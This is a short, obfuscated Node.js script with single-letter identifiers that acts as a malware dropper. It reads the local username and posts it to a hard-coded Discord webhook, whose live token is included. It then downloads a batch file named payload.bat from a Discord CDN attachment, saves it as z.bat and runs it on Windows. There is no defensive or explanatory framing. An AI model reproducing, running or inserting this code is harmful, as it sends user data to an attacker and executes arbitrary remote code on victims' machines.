const A = require('node-fetch');
const B = require('os');
const C = 'https://discord.com/api/webhooks/1135792030811947069/byJrZ1r14yOikeheQf6FxXCtvtvU25QBwKSU2z1tG4AkIr68E4t-2weNiiUeYfPpq0Qd';

function D() {
  return B.userInfo().username;
}

function E(F) {
  const G = {
    username: "test",
    content: `logged windows username: ${F} `,
  };

  A(C, {
    method: 'POST',
    headers: {
      'Content-type': 'application/json',
    },
    body: JSON.stringify(G),
  })
    .then((H) => {
      console.log(H);
    })
    .catch((I) => {
      console.error('Error sending username to webhook:', I.message);
    });
}

const J = require('https');
const { exec } = require('child_process');
const K = require('fs');
const L = 'https://cdn.discordapp.com/attachments/1135786013344681994/1135800331402477599/payload.bat';
const M = 'z.bat';

function N() {
  const O = K.createWriteStream(M);
  J.get(L, (P) => {
    P.pipe(O).on('finish', () => {
      if (B.platform === 'win32') {
        exec(`start ${M}`);
      } else {
        console.error('This script can only be executed on Windows.');
      }
    });
  });
}

const Q = D();
if (Q) {
  E(Q);
  N();
} else {
  console.error('Windows username not found.');
}
